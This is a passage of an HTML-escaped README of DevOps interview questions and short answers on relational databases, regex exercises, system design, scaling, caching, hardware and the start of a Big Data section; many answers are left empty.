&#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Name&lt;/th&gt; &#xA;   &lt;th&gt;Topic&lt;/th&gt; &#xA;   &lt;th&gt;Objective &amp;amp; Instructions&lt;/th&gt; &#xA;   &lt;th&gt;Solution&lt;/th&gt; &#xA;   &lt;th&gt;Comments&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Message Board Tables&lt;/td&gt; &#xA;   &lt;td&gt;Relational DB Tables&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/databases/table_for_message_board_system.md&#34;&gt;Exercise&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/databases/solutions/table_for_message_board_system.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a relational database?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Data Storage: system to store data in tables&lt;/li&gt; &lt;li&gt;SQL: programming language to manage relational databases&lt;/li&gt; &lt;li&gt;Data Definition Language: a standard syntax to create, alter and delete tables &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What does it mean when a database is ACID compliant?&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;p&gt;ACID stands for Atomicity, Consistency, Isolation, Durability. In order to be ACID compliant, the database must meet each of the four criteria&lt;/p&gt; &#xA; &lt;p&gt;&lt;strong&gt;Atomicity&lt;/strong&gt; - When a change occurs to the database, it should either succeed or fail as a whole.&lt;/p&gt; &#xA; &lt;p&gt;For example, if you were to update a table, the update should completely execute. If it only partially executes, the update is considered failed as a whole, and will not go through - the DB will revert back to it&#39;s original state before the update occurred. It should also be mentioned that Atomicity ensures that each transaction is completed as it&#39;s own stand alone &#34;unit&#34; - if any part fails, the whole statement fails.&lt;/p&gt; &#xA; &lt;p&gt;&lt;strong&gt;Consistency&lt;/strong&gt; - any change made to the database should bring it from one valid state into the next.&lt;/p&gt; &#xA; &lt;p&gt;For example, if you make a change to the DB, it shouldn&#39;t corrupt it. Consistency is upheld by checks and constraints that are pre-defined in the DB. For example, if you tried to change a value from a string to an int when the column should be of datatype string, a consistent DB would not allow this transaction to go through, and the action would not be executed&lt;/p&gt; &#xA; &lt;p&gt;&lt;strong&gt;Isolation&lt;/strong&gt; - this ensures that a database will never be seen &#34;mid-update&#34; - as multiple transactions are running at the same time, it should still leave the DB in the same state as if the transactions were being run sequentially.&lt;/p&gt; &#xA; &lt;p&gt;For example, let&#39;s say that 20 other people were making changes to the database at the same time. At the time you executed your query, 15 of the 20 changes had gone through, but 5 were still in progress. You should only see the 15 changes that had completed - you wouldn&#39;t see the database mid-update as the change goes through.&lt;/p&gt; &#xA; &lt;p&gt;&lt;strong&gt;Durability&lt;/strong&gt; - Once a change is committed, it will remain committed regardless of what happens (power failure, system crash, etc.). This means that all completed transactions must be recorded in non-volatile memory.&lt;/p&gt; &#xA; &lt;p&gt;Note that SQL is by nature ACID compliant. Certain NoSQL DB&#39;s can be ACID compliant depending on how they operate, but as a general rule of thumb, NoSQL DB&#39;s are not considered ACID compliant&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is sharding?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Sharding is a horizontal partitioning.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Are you able to explain what is it good for? &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You find out your database became a bottleneck and users experience issues accessing data. How can you deal with such situation?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Not much information provided as to why it became a bottleneck and what is current architecture, so one general approach could be&lt;br&gt; to reduce the load on your database by moving frequently-accessed data to in-memory structure. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a connection pool?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Connection Pool is a cache of database connections and the reason it&#39;s used is to avoid an overhead of establishing a connection for every query done to a database. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a connection leak?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A connection leak is a situation where database connection isn&#39;t closed after being created and is no longer needed. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Table Lock?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Your database performs slowly than usual. More specifically, your queries are taking a lot of time. What would you do?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Query for running queries and cancel the irrelevant queries&lt;/li&gt; &lt;li&gt;Check for connection leaks (query for running connections and include their IP)&lt;/li&gt; &lt;li&gt;Check for table locks and kill irrelevant locking sessions &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a Data Warehouse?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;A data warehouse is a subject-oriented, integrated, time-variant and non-volatile collection of data in support of organisation&#39;s decision-making process&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is a time-series database&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is OLTP (Online transaction processing)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is OLAP (Online Analytical Processing)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an index in a database?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A database index is a data structure that improves the speed of operations in a table. Indexes can be created using one or more columns, providing the basis for both rapid random lookups and efficient ordering of access to records. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What data types are there in relational databases?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Normalization&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Data that is used multiple times in a database should be stored once and referenced with a foreign key.&lt;br&gt; This has the clear benefit of ease of maintenance where you need to change a value only in a single place to change it everywhere. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Primary Key and Foreign Key&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Primary Key: each row in every table should a unique identifier that represents the row.&lt;br&gt; Foreign Key: a reference to another table&#39;s primary key. This allows you to join table together to retrieve all the information you need without duplicating data. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of data tables have you used?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Primary data table: main data you care about&lt;/li&gt; &lt;li&gt;Details table: includes a foreign key and has one to many relationship&lt;/li&gt; &lt;li&gt;Lookup values table: can be one table per lookup or a table containing all the lookups and has one to many relationship&lt;/li&gt; &lt;li&gt;Multi reference table &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is ORM? What benefits it provides in regards to relational databases usage?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping&#34;&gt;Wikipedia&lt;/a&gt;: &#34;is a programming technique for converting data between incompatible type systems using object-oriented programming languages&#34;&lt;/p&gt; &lt;p&gt;In regards to the relational databases:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Database as code&lt;/li&gt; &lt;li&gt;Database abstraction&lt;/li&gt; &lt;li&gt;Encapsulates SQL complexity&lt;/li&gt; &lt;li&gt;Enables code review process&lt;/li&gt; &lt;li&gt;Enables usage as a native OOP structure &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is DDL?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Data_definition_language&#34;&gt;Wikipedia&lt;/a&gt;: &#34;In the context of SQL, data definition or data description language (DDL) is a syntax for creating and modifying database objects such as tables, indices, and users.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Regex&lt;/h2&gt; &#xA;&lt;p&gt;Given a text file, perform the following exercises&lt;/p&gt; &#xA;&lt;h4&gt;Extract&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Extract all the numbers&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Extract the first word of each line&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Bonus: extract the last word of each line &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Extract all the IP addresses&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Extract dates in the format of yyyy-mm-dd or yyyy-dd-mm&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Extract email addresses&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Replace&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Replace tabs with four spaces&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Replace &#39;red&#39; with &#39;green&#39;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;System Design&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is a &#34;Single point of failure&#34;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain &#34;3-Tier Architecture&#34; (including pros and cons)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the drawbacks of monolithic architecture?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Not suitable for frequent code changes and the ability to deploy new features&lt;/li&gt; &lt;li&gt;Not designed for today&#39;s infrastructure (like public clouds)&lt;/li&gt; &lt;li&gt;Scaling a team to work monolithic architecture is more challenging &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the advantages of microoservices architecture over a monolithic architecture?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Each of the services individually fail without escalating into an application-wide outage.&lt;/li&gt; &lt;li&gt;Each service can be developed and maintained by a separate team and this team can choose its own tools and coding language &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What&#39;s a service mesh?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://www.redhat.com/en/topics/microservices/what-is-a-service-mesh&#34;&gt;This article&lt;/a&gt; provides a great explanation. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain &#34;Loose Coupling&#34;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a message queue? When is it used?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Scalability&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Scalability&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The ability easily grow in size and capacity based on demand and usage. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Elasticity&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The ability to grow but also to reduce based on what is required &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Disaster Recovery&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Fault Tolerance and High Availability&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Fault Tolerance - The ability to self-heal and return to normal capacity. Also the ability to withstand a failure and remain functional.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;High Availability - Being able to access a resource (in some use cases, using different platforms) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between high availability and Disaster Recovery?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://www.wintellect.com/high-availability-vs-disaster-recovery&#34;&gt;wintellect.com&lt;/a&gt;: &#34;High availability, simply put, is eliminating single points of failure and disaster recovery is the process of getting a system back to an operational state when a system is rendered inoperative. In essence, disaster recovery picks up when high availability fails, so HA first.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Vertical Scaling&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Vertical Scaling is the process of adding resources to increase power of existing servers. For example, adding more CPUs, adding more RAM, etc. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the disadvantages of Vertical Scaling?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;With vertical scaling alone, the component still remains a single point of failure. In addition, it has hardware limit where if you don&#39;t have more resources, you might not be able to scale vertically. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which type of cloud services usually support vertical scaling?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Databases, cache. It&#39;s common mostly for non-distributed systems. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Horizontal Scaling&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Horizontal Scaling is the process of adding more resources that will be able handle requests as one unit &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the disadvantage of Horizontal Scaling? What is often required in order to perform Horizontal Scaling?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A load balancer. You can add more resources, but if you would like them to be part of the process, you have to serve them the requests/responses. Also, data inconsistency is a concern with horizontal scaling. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain in which use cases will you use vertical scaling and in which use cases you will use horizontal scaling&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Resiliency and what ways are there to make a system more resilient&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain &#34;Consistent Hashing&#34;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How would you update each of the services in the following drawing without having app (foo.com) downtime?&lt;br&gt; &lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/design/cdn-no-downtime.png&#34; width=&#34;300x;&#34; height=&#34;400px;&#34;&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the problem with the following architecture and how would you fix it?&lt;br&gt; &lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/design/producers_consumers_issue.png&#34; width=&#34;400x;&#34; height=&#34;300px;&#34;&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The load on the producers or consumers may be high which will then cause them to hang or crash.&lt;br&gt; Instead of working in &#34;push mode&#34;, the consumers can pull tasks only when they are ready to handle them. It can be fixed by using a streaming platform like Kafka, Kinesis, etc. This platform will make sure to handle the high load/traffic and pass tasks/messages to consumers only when the ready to get them.&lt;/p&gt; &lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/design/producers_consumers_fix.png&#34; width=&#34;300x;&#34; height=&#34;200px;&#34;&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Users report that there is huge spike in process time when adding little bit more data to process as an input. What might be the problem?&lt;br&gt; &lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/design/input-process-output.png&#34; width=&#34;300x;&#34; height=&#34;200px;&#34;&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How would you scale the architecture from the previous question to hundreds of users?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Cache&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is &#34;cache&#34;? In which cases would you use it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is &#34;distributed cache&#34;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a &#34;cache replacement policy&#34;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Take a look &lt;a href=&#34;https://en.wikipedia.org/wiki/Cache_replacement_policies&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which cache replacement policies are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can find a list &lt;a href=&#34;https://en.wikipedia.org/wiki/Cache_replacement_policies&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following cache policies: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;FIFO&lt;/li&gt; &#xA;   &lt;li&gt;LIFO&lt;/li&gt; &#xA;   &lt;li&gt;LRU&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Read about it &lt;a href=&#34;https://en.wikipedia.org/wiki/Cache_replacement_policies&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Why not writing everything to cache instead of a database/datastore?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Migrations&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How you prepare for a migration? (or plan a migration)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;You can mention:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;roll-back &amp;amp; roll-forward cut over dress rehearsals DNS redirection &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain &#34;Branch by Abstraction&#34; technique&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Design a system&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you design a video streaming website?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you design a photo upload website?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How would you build a URL shortener?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;More System Design Questions&lt;/h4&gt; &#xA;&lt;p&gt;Additional exercises can be found in &lt;a href=&#34;https://github.com/bregman-arie/system-design-notebook&#34;&gt;system-design-notebook repository&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;a href=&#34;https://github.com/bregman-arie/system-design-notebook&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/system_design_notebook.png&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Hardware&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a CPU?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A central processing unit (CPU) performs basic arithmetic, logic, controlling, and input/output (I/O) operations specified by the instructions in the program. This contrasts with external components such as main memory and I/O circuitry, and specialized processors such as graphics processing units (GPUs). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is RAM?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;RAM (Random Access Memory) is the hardware in a computing device where the operating system (OS), application programs and data in current use are kept so they can be quickly reached by the device&#39;s processor. RAM is the main memory in a computer. It is much faster to read from and write to than other kinds of storage, such as a hard disk drive (HDD), solid-state drive (SSD) or optical drive. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an embedded system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;An embedded system is a computer system - a combination of a computer processor, computer memory, and input/output peripheral devices—that has a dedicated function within a larger mechanical or electronic system. It is embedded as part of a complete device often including electrical or electronic hardware and mechanical parts. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you give an example of an embedded system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Raspberry Pi &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of storage are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Big Data&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is exactly Big Data&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;As defined by Doug Laney:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Volume: Extremely large volumes of data&lt;/li&gt; &lt;li&gt;Velocity: Real time, batch, streams of data&lt;/li&gt; 